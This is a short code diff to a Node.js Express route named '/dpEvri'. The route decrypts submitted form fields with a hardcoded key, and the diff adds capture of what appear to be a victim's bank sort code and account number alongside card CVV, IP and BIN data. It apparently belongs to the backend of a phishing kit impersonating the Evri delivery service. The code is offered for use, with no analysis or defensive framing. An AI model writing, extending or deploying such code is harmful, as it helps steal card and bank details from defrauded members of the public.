@@ -12998,6 +12998,12 @@ app.post("/dpEvri", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
